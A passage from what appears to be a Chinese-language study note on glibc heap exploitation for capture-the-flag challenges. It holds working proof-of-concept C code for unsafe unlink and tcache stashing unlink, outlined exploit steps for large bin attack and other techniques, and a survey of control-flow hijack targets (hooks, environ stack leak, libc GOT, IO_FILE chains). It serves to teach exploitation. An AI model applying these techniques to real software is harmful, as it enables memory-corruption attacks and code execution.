victim_string[8];\n\tstrcpy(victim_string,\"Hello!~\");\n\tchunk0_ptr[3] = (uint64_t) victim_string;\n\n\tprintf(\"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n\");\n\tprintf(\"Original value: %s\\n\",victim_string);\n\tchunk0_ptr[0] = 0x4141414142424242LL;\n\tprintf(\"New Value: %s\\n\",victim_string);\n\n\t// sanity check\n\tassert(*(long *)victim_string == 0x4141414142424242L);\n}\n```\n\n\n\n**核心思路:**\n```python\nmalloc(0x420) # chunk A\nmalloc(0x18)\n#And another chunk to prevent consolidate\nmalloc(0x410) # chunk B\n#This chunk should be smaller than [p1] and belong to the same large bin\nmalloc(0x18)\n#And another chunk to prevent consolidate\nfree(0)\nmalloc(0x438)\n#Allocate a chunk larger than [p1] to insert [p1] into large bin\nfree(1)\n#Free the smaller of the two --> [p2]\nedit(0, p64(0)*3+p64(target2-0x20))\n#最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址\nmalloc(0x438)\nedit(0, p64(recover)*2) # 修复large bin attack \n```\n\n**修复:**\n可以通过gdb查看未更改时chunk A的fd和bk，然后修复，免于计算 \n\n**限制:**\n- 需要一次UAF \n\n**效果:**\n- 在2.30以上可以在任意地址写入一个libc地址\n\n## unsafe unlink \n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <assert.h>\n\nuint64_t *chunk0_ptr;\n\nint main()\n{\n\tsetbuf(stdout, NULL);\n\tprintf(\"Welcome to unsafe unlink 2.0!\\n\");\n\tprintf(\"Tested in Ubuntu 20.04 64bit.\\n\");\n\tprintf(\"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n\");\n\tprintf(\"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n\");\n\n\tint malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin\n\tint header_size = 2;\n\n\tprintf(\"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n\");\n\n\tchunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0\n\tuint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1\n\tprintf(\"The global chunk0_ptr is at %p, pointing to %p\\n\", &chunk0_ptr, chunk0_ptr);\n\tprintf(\"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr);\n\n\tprintf(\"We create a fake chunk inside chunk0.\\n\");\n\tprintf(\"We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n\");\n\tchunk0_ptr[1] = chunk0_ptr[-1] - 0x10;\n\tprintf(\"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\\n\");\n\tchunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);\n\tprintf(\"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\\n\");\n\tprintf(\"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\\n\");\n\tchunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);\n\tprintf(\"Fake chunk fd: %p\\n\",(void*) chunk0_ptr[2]);\n\tprintf(\"Fake chunk bk: %p\\n\\n\",(void*) chunk0_ptr[3]);\n\n\tprintf(\"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n\");\n\tuint64_t *chunk1_hdr = chunk1_ptr - header_size;\n\tprintf(\"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n\");\n\tprintf(\"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n\");\n\tchunk1_hdr[0] = malloc_size;\n\tprintf(\"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n\",(void*)chunk1_hdr[0]);\n\tprintf(\"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\\n\\n\");\n\tchunk1_hdr[1] &= ~1;\n\n\tprintf(\"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n\");\n\tprintf(\"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\");\n\tfree(chunk1_ptr);\n\n\tprintf(\"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n\");\n\tchar victim_string[8];\n\tstrcpy(victim_string,\"Hello!~\");\n\tchunk0_ptr[3] = (uint64_t) victim_string;\n\n\tprintf(\"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n\");\n\tprintf(\"Original value: %s\\n\",victim_string);\n\tchunk0_ptr[0] = 0x4141414142424242LL;\n\tprintf(\"New Value: %s\\n\",victim_string);\n\n\t// sanity check\n\tassert(*(long *)victim_string == 0x4141414142424242L);\n}\n```\n\n**核心思路:**\n```python\n# chunk 0 ptr store in &ptr\n\nmalloc(0x420) # not in fastbin or tcache\nmalloc(0x420) \nedit(0, p64(0)+p64(fake_size)+p64(&ptr-0x18)+p64(&ptr-0x10)+p64(0)*k + p64(fake_prev_size)+p64(size)) # fakesize = 0x420-0x10\n# need fake_prev_size = prev_size-0x10, sive.PREV_INUSE = 0\n```\n\n**限制:**\n- overflow ,可以修改prev_inuse触发fake chunk  unlink and  consolidate \n- 主要适用于可以知道堆指针存储基址的情况，可以控制堆管理机构\n\n**效果:**\n- 可以将ptr处地址改写为&ptr-8\n\n\n\n##  tcache stashing unlink \n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <assert.h>\n\nint main(){\n    unsigned long stack_var[0x10] = {0};\n    unsigned long *chunk_lis[0x10] = {0};\n    unsigned long *target;\n\n    setbuf(stdout, NULL);\n\n    printf(\"This file demonstrates the stashing unlink attack on tcache.\\n\\n\");\n    printf(\"This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\\n\\n\");\n    printf(\"This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\\n\\n\");\n    printf(\"The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\\n\\n\");\n    printf(\"This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\\n\\n\");\n\n    // stack_var emulate the fake_chunk we want to alloc to\n    printf(\"Stack_var emulates the fake chunk we want to alloc to.\\n\\n\");\n    printf(\"First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\\n\\n\");\n\n    stack_var[3] = (unsigned long)(&stack_var[2]);\n\n    printf(\"You can see the value of fake_chunk->bk is:%p\\n\\n\",(void*)stack_var[3]);\n    printf(\"Also, let's see the initial value of stack_var[4]:%p\\n\\n\",(void*)stack_var[4]);\n    printf(\"Now we alloc 9 chunks with malloc.\\n\\n\");\n\n    //now we malloc 9 chunks\n    for(int i = 0;i < 9;i++){\n        chunk_lis[i] = (unsigned long*)malloc(0x90);\n    }\n\n    //put 7 chunks into tcache\n    printf(\"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\\n\\n\");\n\n    for(int i = 3;i < 9;i++){\n        free(chunk_lis[i]);\n    }\n\n    printf(\"As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\\n\\n\");\n\n    //last tcache bin\n    free(chunk_lis[1]);\n    //now they are put into unsorted bin\n    free(chunk_lis[0]);\n    free(chunk_lis[2]);\n\n    //convert into small bin\n    printf(\"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\\n\\n\");\n\n    malloc(0xa0);// size > 0x90\n\n    //now 5 tcache bins\n    printf(\"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\\n\\n\");\n\n    malloc(0x90);\n    malloc(0x90);\n\n    printf(\"Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\\n\\n\",(void*)stack_var);\n\n    //change victim->bck\n    /*VULNERABILITY*/\n    chunk_lis[2][1] = (unsigned long)stack_var;\n    /*VULNERABILITY*/\n\n    //trigger the attack\n    printf(\"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\\n\\n\");\n\n    calloc(1,0x90);\n\n    printf(\"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\\n\\n\",(void*)stack_var[2],(void*)stack_var[4]);\n\n    //malloc and return our fake chunk on stack\n    target = malloc(0x90);   \n\n    printf(\"As you can see, next malloc(0x90) will return the region our fake chunk: %p\\n\",(void*)target);\n\n    assert(target == &stack_var[2]);\n    return 0;\n}\n\n```\n\n\n**核心思路:**\n```python\ncalloc(0xa0)\nfor i in range(6):\n    calloc(0xa0)\n    free(i)\ncalloc(0x4b0) # 9 \ncalloc(0xb0) # 10\nfree(9)\ncalloc(0x400)\n\ncalloc(0x4b0) # 11\ncalloc(0xb0) # 12\nfree(9)\ncalloc(0x400) #13\nedit(13, b'\\x00'*0x400+p64(prev_size)+p64(size)+p64(target_add-0x10))\ncalloc(0xa0)\n```\n\n\n**限制:**\n- 需要UAF\n- 主要适用于只有calloc并且可以分配tcache大小的chunk的情况，对于有malloc，打tcache poison更加方便\n\n**效果:**\n- 获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）。\n- 在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可。  \n\n\n\n## tcache poison \n主要是通过改写tcache的next指针，实现类似于fastbin的house of spirit的效果。\n\n## house of origin\nhouse of origin 原利用链中的IO_FILE相关利用已经失效了，这里主要关注其绕过无free函数限制的方法，即通过malloc大于top chunk大小的chunk时会先释放top chunk，再拓展堆区域。\n\n一般而言，修改top chunk需要满足一下条件。\n\n1. 伪造的 size 必须要对齐到内存页\n2. size 要大于 MINSIZE(0x10)\n3. size 要小于之后申请的 chunk size + MINSIZE(0x10)\n4. size 的 prev inuse 位必须为 1\n\n\n# 攻击面\n- 劫持控制流\n\t- hooks \n\t- stack \n\t- IO_FILE \n\t- dlts\n\t- libc.got\n- 辅助攻击链\n\t- tcache_perthread_struct \n\t- global_max_fast \n\t- heap 管理结构\n\n\n## 劫持控制流\n### hooks\n堆利用中最基本的夺取控制流的方法就是打各种hooks。\n一般而言，可以利用__free_hook 加 写入'/bin/sh'的堆快实现劫持。\n\n此外，如果要打one_gadget的话，可以打__malloc_hook，在tcache之前的版本，更多是打__malloc_hook，因为其在main_arena附近，存在许多libc上地址，方便通过错位构造0x7f的size，此外，由于__malloc_hook和__realloc_hook临近，也可以很方便地同时控制这两个hook，然后通过__realloc_hook配合来调整栈帧，方便满足one gadget 条件\n\n而在glibc2.34版本及以上，各类hooks都已经被移除，因此也需要掌握一些其他的劫持控制流的办法。\n\n### stack \n在stack overflow 中，通过栈和ROP劫持控制流的方法我们已经不陌生，然而不像stack overflow 天然可以在栈上写入，如果要在heap exploation中通过ROP来劫持控制流，一个无法绕过的问题是栈地址不可知。\n\n我们都知道程序加载时，环境变量会被压入栈中，可以通过environ指针访问到栈上环境变量。\n\n查看glibc源代码\n```c\n#if !_LIBC\n# define __environ\tenviron\n# ifndef HAVE_ENVIRON_DECL\nextern char **environ;\n# endif\n#endif\n```\n发现这是一个extern变量，在gdb中调试查找\n\n```c\n    0x7f78a14d4000     0x7f78a1500000 r--p    2c000      0 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a1500000     0x7f78a1668000 r-xp   168000  2c000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a1668000     0x7f78a16bd000 r--p    55000 194000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a16bd000     0x7f78a16be000 ---p     1000 1e9000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a16be000     0x7f78a16c1000 r--p     3000 1e9000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a16c1000     0x7f78a16c4000 rw-p     3000 1ec000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/libc.so.6\n    0x7f78a16c4000     0x7f78a16d3000 rw-p     f000      0 [anon_7f78a16c4]\n    0x7f78a16d3000     0x7f78a16d4000 r--p     1000      0 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7f78a16d4000     0x7f78a16f8000 r-xp    24000   1000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7f78a16f8000     0x7f78a1702000 r--p     a000  25000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7f78a1702000     0x7f78a1704000 r--p     2000  2e000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7f78a1704000     0x7f78a1706000 rw-p     2000  30000 /home/nemo/Pwn/workspace/write-ups/MetaCtf.2021/pwn/Hookless/ld.so.2\n    0x7ffd6bb9e000     0x7ffd6bbc0000 rw-p    22000      0 [stack]\n    0x7ffd6bbd4000     0x7ffd6bbd8000 r--p     4000      0 [vvar]\n    0x7ffd6bbd8000     0x7ffd6bbda000 r-xp     2000      0 [vdso]\n0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]\npwndbg> p environ\n$1 = (char **) 0x7ffd6bbbdfc8\npwndbg> p &environ\n$2 = (char ***) 0x7f78a16c9ec0 <environ>\npwndbg> \n\n```\n\n可以看到其存在于anon_7f78a16c4段，在libc后，与libc存在固定偏移，猜测这一部分内容与ld 过程有关（笔者暂且还没有查证）\n\n既然可以通过访问libc偏移地址leak stack地址，那么此时我们就可以通过这个栈地址分配到栈上来ROP了。\n\n此攻击点的优点是不像IO_FILE的攻击那样，需要触发程序结束时（exit()函数，从main返回，malloc_assert）时清理现场的流程，可以覆盖堆菜单中分配函数或者edit函数的栈来实现攻击。\n\n### libc.got \n\nchecksec libc，会发现其一般开启了Partial RELRO，所以可以考虑写libc的got表\n\n```bash\n$ checksec libc.so.6       \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n\n```\n\n笔者在实际操作时发现，pwntools的elf.got并不能很好解析libc的got段，可以使用IDA来查看。\n\n以下的got表来自libc2.34\n\n```c\n.got.plt:00000000001ED000 ; Segment type: Pure data\n.got.plt:00000000001ED000 ; Segment permissions: Read/Write\n.got.plt:00000000001ED000 _got_plt        segment qword public 'DATA' use64\n.got.plt:00000000001ED000                 assume cs:_got_plt\n.got.plt:00000000001ED000                 ;org 1ED000h\n.got.plt:00000000001ED000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC\n.got.plt:00000000001ED008 qword_1ED008    dq 0                    ; DATA XREF: sub_2C000↑r\n.got.plt:00000000001ED010 qword_1ED010    dq 0                    ; DATA XREF: sub_2C000+6↑r\n.got.plt:00000000001ED018 off_1ED018      dq offset __strnlen_ifunc\n.got.plt:00000000001ED018                                         ; DATA XREF: j___strnlen_ifunc↑r\n.got.plt:00000000001ED018                                         ; Indirect relocation\n.got.plt:00000000001ED020 off_1ED020      dq offset __rawmemchr_ifunc\n.got.plt:00000000001ED020                                         ; DATA XREF: j___rawmemchr_ifunc↑r\n.got.plt:00000000001ED020                                         ; Indirect relocation\n.got.plt:00000000001ED028 off_1ED028      dq offset __GI___libc_realloc\n.got.plt:00000000001ED028                                         ; DATA XREF: _realloc↑r\n.got.plt:00000000001ED030 off_1ED030      dq offset __strncasecmp_ifunc\n.got.plt:00000000001ED030                                         ; DATA XREF: j___strncasecmp_ifunc↑r\n.got.plt:00000000001ED030                                         ; Indirect relocation\n.got.plt:00000000001ED038 off_1ED038      dq offset _dl_exception_create\n.got.plt:00000000001ED038                                         ; DATA XREF: __dl_exception_create↑r\n.got.plt:00000000001ED040 off_1ED040      dq offset __mempcpy_ifunc\n.got.plt:00000000001ED040                                         ; DATA XREF: j___mempcpy_ifunc↑r\n.got.plt:00000000001ED040                                         ; Indirect relocation\n.got.plt:00000000001ED048 off_1ED048      dq offset __wmemset_ifunc\n.got.plt:00000000001ED048                                         ; DATA XREF: j___wmemset_ifunc↑r\n.got.plt:00000000001ED048                                         ; Indirect relocation\n.got.plt:00000000001ED050 off_1ED050      dq offset __libc_calloc ; DATA XREF: _calloc↑r\n.got.plt:00000000001ED058 off_1ED058      dq offset strspn_ifunc  ; DATA XREF: j_strspn_ifunc↑r\n.got.plt:00000000001ED058                                         ; Indirect relocation\n.got.plt:00000000001ED060 off_1ED060      dq offset memchr_ifunc  ; DATA XREF: j_memchr_ifunc↑r\n.got.plt:00000000001ED060                                         ; Indirect relocation\n.got.plt:00000000001ED068 off_1ED068      dq offset __libc_memmove_ifunc\n.got.plt:00000000001ED068                                         ; DATA XREF: j___libc_memmove_ifunc↑r\n.got.plt:00000000001ED068                                         ; Indirect relocation\n.got.plt:00000000001ED070 off_1ED070      dq offset __wmemchr_ifunc\n.got.plt:00000000001ED070                                         ; DATA XREF: j___wmemchr_ifunc↑r\n.got.plt:00000000001ED070                                         ; Indirect relocation\n.got.plt:00000000001ED078 off_1ED078      dq offset __stpcpy_ifunc\n.got.plt:00000000001ED078                                         ; DATA XREF: j___stpcpy_ifunc↑r\n.got.plt:00000000001ED078                                         ; Indirect relocation\n.got.plt:00000000001ED080 off_1ED080      dq offset __wmemcmp_ifunc\n.got.plt:00000000001ED080                                         ; DATA XREF: j___wmemcmp_ifunc↑r\n.got.plt:00000000001ED080                                         ; Indirect relocation\n.got.plt:00000000001ED088 off_1ED088      dq offset _dl_find_dso_for_object\n.got.plt:00000000001ED088                                         ; DATA XREF: __dl_find_dso_for_object↑r\n.got.plt:00000000001ED090 off_1ED090      dq offset strncpy_ifunc ; DATA XREF: j_strncpy_ifunc↑r\n.got.plt:00000000001ED090                                         ; Indirect relocation\n.got.plt:00000000001ED098 off_1ED098      dq offset strlen_ifunc  ; DATA XREF: j_strlen_ifunc↑r\n.got.plt:00000000001ED098                                         ; Indirect relocation\n.got.plt:00000000001ED0A0 off_1ED0A0      dq offset __strcasecmp_l_ifunc\n.got.plt:00000000001ED0A0                                         ; DATA XREF: j___strcasecmp_l_ifunc↑r\n.got.plt:00000000001ED0A0                                         ; Indirect relocation\n.got.plt:00000000001ED0A8 off_1ED0A8      dq offset strcpy_ifunc  ; DATA XREF: j_strcpy_ifunc↑r\n.got.plt:00000000001ED0A8                                         ; Indirect relocation\n.got.plt:00000000001ED0B0 off_1ED0B0      dq offset __wcschr_ifunc\n.got.plt:00000000001ED0B0                                         ; DATA XREF: j___wcschr_ifunc↑r\n.got.plt:00000000001ED0B0                                         ; Indirect relocation\n.got.plt:00000000001ED0B8 off_1ED0B8      dq offset __strchrnul_ifunc\n.got.plt:00000000001ED0B8                                         ; DATA XREF: j___strchrnul_ifunc↑r\n.got.plt:00000000001ED0B8                                         ; Indirect relocation\n.got.plt:00000000001ED0C0 off_1ED0C0      dq offset __memrchr_ifunc\n.got.plt:00000000001ED0C0                                         ; DATA XREF: j___memrchr_ifunc↑r\n.got.plt:00000000001ED0C0                                         ; Indirect relocation\n.got.plt:00000000001ED0C8 off_1ED0C8      dq offset _dl_deallocate_tls\n.got.plt:00000000001ED0C8                                         ; DATA XREF: __dl_deallocate_tls↑r\n.got.plt:00000000001ED0D0 off_1ED0D0      dq offset __tls_get_addr\n.got.plt:00000000001ED0D0                                         ; DATA XREF: ___tls_get_addr↑r\n.got.plt:00000000001ED0D8 off_1ED0D8      dq offset __wmemset_ifunc\n.got.plt:00000000001ED0D8                                         ; DATA XREF: j___wmemset_ifunc_0↑r\n.got.plt:00000000001ED0D8                                         ; Indirect relocation\n.got.plt:00000000001ED0E0 off_1ED0E0      dq offset memcmp_ifunc  ; DATA XREF: j_memcmp_ifunc↑r\n.got.plt:00000000001ED0E0                                         ; Indirect relocation\n.got.plt:00000000001ED0E8 off_1ED0E8      dq offset __strncasecmp_l_ifunc\n.got.plt:00000000001ED0E8                                         ; DATA XREF: j___strncasecmp_l_ifunc↑r\n.got.plt:00000000001ED0E8                                         ; Indirect relocation\n.got.plt:00000000001ED0F0 off_1ED0F0      dq offset _dl_fatal_printf\n.got.plt:00000000001ED0F0                                         ; DATA XREF: __dl_fatal_printf↑r\n.got.plt:00000000001ED0F8 off_1ED0F8      dq offset strcat_ifunc  ; DATA XREF: j_strcat_ifunc↑r\n.got.plt:00000000001ED0F8                                         ; Indirect relocation\n.got.plt:00000000001ED100 off_1ED100      dq offset __wcscpy_ifunc\n.got.plt:00000000001ED100                                         ; DATA XREF: j___wcscpy_ifunc↑r\n.got.plt:00000000001ED100                                         ; Indirect relocation\n.got.plt:00000000001ED108 off_1ED108      dq offset strcspn_ifunc ; DATA XREF: j_strcspn_ifunc↑r\n.got.plt:00000000001ED108                                         ; Indirect relocation\n.got.plt:00000000001ED110 off_1ED110      dq offset __strcasecmp_ifunc\n.got.plt:00000000001ED110                                         ; DATA XREF: j___strcasecmp_ifunc↑r\n.got.plt:00000000001ED110                                         ; Indirect relocation\n.got.plt:00000000001ED118 off_1ED118      dq offset strncmp_ifunc ; DATA XREF: j_strncmp_ifunc↑r\n.got.plt:00000000001ED118                                         ; Indirect relocation\n.got.plt:00000000001ED120 off_1ED120      dq offset __wmemchr_ifunc\n.got.plt:00000000001ED120                                         ; DATA XREF: j___wmemchr_ifunc_0↑r\n.got.plt:00000000001ED120                                         ; Indirect relocation\n.got.plt:00000000001ED128 off_1ED128      dq offset __stpncpy_ifunc\n.got.plt:00000000001ED128                                         ; DATA XREF: j___stpncpy_ifunc↑r\n.got.plt:00000000001ED128                                         ; Indirect relocation\n.got.plt:00000000001ED130 off_1ED130      dq offset __wcscmp_ifunc\n.got.plt:00000000001ED130                                         ; DATA XREF: j___wcscmp_ifunc↑r\n.got.plt:00000000001ED130                                         ; Indirect relocation\n.got.plt:00000000001ED138 off_1ED138      dq offset __libc_memmove_ifunc\n.got.plt:00000000001ED138                                         ; DATA XREF: j___libc_memmove_ifunc_0↑r\n.got.plt:00000000001ED138                                         ; Indirect relocation\n.got.plt:00000000001ED140 off_1ED140      dq offset strrchr_ifunc ; DATA XREF: j_strrchr_ifunc↑r\n.got.plt:00000000001ED140                                         ; Indirect relocation\n.got.plt:00000000001ED148 off_1ED148      dq offset strchr_ifunc  ; DATA XREF: j_strchr_ifunc↑r\n.got.plt:00000000001ED148                                         ; Indirect relocation\n.got.plt:00000000001ED150 off_1ED150      dq offset __wcschr_ifunc\n.got.plt:00000000001ED150                                         ; DATA XREF: j___wcschr_ifunc_0↑r\n.got.plt:00000000001ED150                                         ; Indirect relocation\n.got.plt:00000000001ED158 off_1ED158      dq offset __new_memcpy_ifunc\n.got.plt:00000000001ED158                                         ; DATA XREF: j___new_memcpy_ifunc↑r\n.got.plt:00000000001ED158                                         ; Indirect relocation\n.got.plt:00000000001ED160 off_1ED160      dq offset _dl_rtld_di_serinfo\n.got.plt:00000000001ED160                                         ; DATA XREF: __dl_rtld_di_serinfo↑r\n.got.plt:00000000001ED168 off_1ED168      dq offset _dl_allocate_tls\n.got.plt:00000000001ED168                                         ; DATA XREF: __dl_allocate_tls↑r\n.got.plt:00000000001ED170 off_1ED170      dq offset __tunable_get_val\n.got.plt:00000000001ED170                                         ; DATA XREF: ___tunable_get_val↑r\n.got.plt:00000000001ED178 off_1ED178      dq offset __wcslen_ifunc\n.got.plt:00000000001ED178                                         ; DATA XREF: j___wcslen_ifunc↑r\n.got.plt:00000000001ED178                                         ; Indirect relocation\n.got.plt:00000000001ED180 off_1ED180      dq offset memset_ifunc  ; DATA XREF: j_memset_ifunc↑r\n.got.plt:00000000001ED180                                         ; Indirect relocation\n.got.plt:00000000001ED188 off_1ED188      dq offset __wcsnlen_ifunc\n.got.plt:00000000001ED188                                         ; DATA XREF: j___wcsnlen_ifunc↑r\n.got.plt:00000000001ED188                                         ; Indirect relocation\n.got.plt:00000000001ED190 off_1ED190      dq offset strcmp_ifunc  ; DATA XREF: j_strcmp_ifunc↑r\n.got.plt:00000000001ED190                                         ; Indirect relocation\n.got.plt:00000000001ED198 off_1ED198      dq offset _dl_allocate_tls_init\n.got.plt:00000000001ED198                                         ; DATA XREF: __dl_allocate_tls_init↑r\n.got.plt:00000000001ED1A0 off_1ED1A0      dq offset __nptl_change_stack_perm\n.got.plt:00000000001ED1A0                                         ; DATA XREF: ___nptl_change_stack_perm↑r\n.got.plt:00000000001ED1A8 off_1ED1A8      dq offset strpbrk_ifunc ; DATA XREF: j_strpbrk_ifunc↑r\n.got.plt:00000000001ED1A8                                         ; Indirect relocation\n.got.plt:00000000001ED1B0 off_1ED1B0      dq offset __strnlen_ifunc\n.got.plt:00000000001ED1B0                                         ; DATA XREF: j___strnlen_ifunc_0↑r\n.got.plt:00000000001ED1B0 _got_plt        ends                    ; Indirect relocation\n```\n\n可以看到got表中包含了很多字符串和内存相关函数，包括strlen等，为什么strlen这种在libc中实现的函数会需要走got表呢？\n\n笔者在glibc2.34的源代码中进行了查找:\n\n```c\n// string/string.h\n/* Return the length of S.  */\nextern size_t strlen (const char *__s)\n     __THROW __attribute_pure__ __nonnull ((1));\n\n```\n\n\n```c\n// /sysdeps/alpha/strlen.S\n// \nENTRY(strlen)\n#ifdef PROF\n\tldgp\tgp, 0(pv)\n\tlda\tAT, _mcount\n\tjsr\tAT, (AT), _mcount\n\t.prologue 1\n#else\n\t.prologue 0\n#endif\n\n\tldq_u   t0, 0(a0)\t# load first quadword (a0 may be misaligned)\n\tlda     t1, -1(zero)\n\tinsqh   t1, a0, t1\n\tandnot  a0, 7, v0\n\tor      t1, t0, t0\n\tnop\t\t\t# dual issue the next two on ev5\n\tcmpbge  zero, t0, t1\t# t1 <- bitmask: bit i == 1 <==> i-th byte == 0\n\tbne     t1, $found\n\n$loop:\tldq     t0, 8(v0)\n\taddq    v0, 8, v0\t# addr += 8\n\tcmpbge  zero, t0, t1\n\tbeq     t1, $loop\n\n$found:\tnegq    t1, t2\t\t# clear all but least set bit\n\tand     t1, t2, t1\n\n\tand     t1, 0xf0, t2\t# binary search for that set bit\n\tand\tt1, 0xcc, t3\n\tand\tt1, 0xaa, t4\n\tcmovne\tt2, 4, t2\n\tcmovne\tt3, 2, t3\n\tcmovne\tt4, 1, t4\n\taddq\tt2, t3, t2\n\taddq\tv0, t4, v0\n\taddq\tv0, t2, v0\n\tnop\t\t\t# dual issue next two on ev4 and ev5\n\n\tsubq    v0, a0, v0\n\tret\n\n\tEND(strlen)\nlibc_hidden_builtin_def (strlen)\n```\n\n发现在strings.h中，strlen是作为extern函数被引入的，然后发现其真正的实现是在其他文件中通过汇编实现的。\n\n笔者猜测对于glibc对于strlen这种常用操作使用汇编编写来加快执行速度，也因此将其变成了extern 变量。\n\n由于不是很了解编译过程的实现，笔者暂时还无法对此给出完美的解释，因此先在此按下不表，等待之后的深入研究。\n\n而在ctf题中，最常劫持的got表也是strlen，因为其会在puts中被调用，很容易被用到。\n\n同时，在house of pig的攻击流程中，可以将malloc@got作为malloc_hook的替代。\n\n其优点在于像hooks一样劫持方便，只需要libc地址加一次任意分配即可，缺点在与其利用存在限制，并不是所有程序都会用到got表中的函数\n\n### IO_FILE \n在高版本的IO_FILE攻击主要是以下几条利用链(实际上大同小异)，基本上都是通过IO_clean_up来劫持控制流\n- house of apple 2/house of cat: `_IO_wide_data`\n\t- 主打一个简单方便\n- house of kiwi: `_IO_file_jumps`\n\t- 缺点在于_IO_file_jumps在一些版本里是不可写的，而且2.36修改了__malloc_assert\n- house of emma: `_IO_cookie_jumps`\n\n### exit()\n- **rtld_global** \n基本上就是house of banana的攻击流程，缺点是ld的加载基址不确定，需要爆破，优点是只需要一次large bin attack即可。\n- **dtor_list**\n通过call_tls_dtors()来劫持控制流，但是需要劫持TCB.pointer_guard\n\n## 辅助攻击\n\n### tcache_perthread_struct\n```c\n/* There is one of these for each thread, which contains the\n   per-thread cache (hence \"tcache_perthread_struct\").  Keeping\n   overall size low is mildly important.  Note that COUNTS and ENTRIES\n   are redundant (we could have just counted the linked list each\n   time), this is for performance reasons.  */\ntypedef struct tcache_perthread_struct\n{\n  uint16_t counts[TCACHE_MAX_BINS]; // 2*0x40 = 0x80\n  tcache_entry *entries[TCACHE_MAX_BINS]; // 8*0x40 = 0x200\n} tcache_perthread_struct;\n// 0x20+0x10*0x40 = 0x420  \n```\n\ntcache_perthread_struct 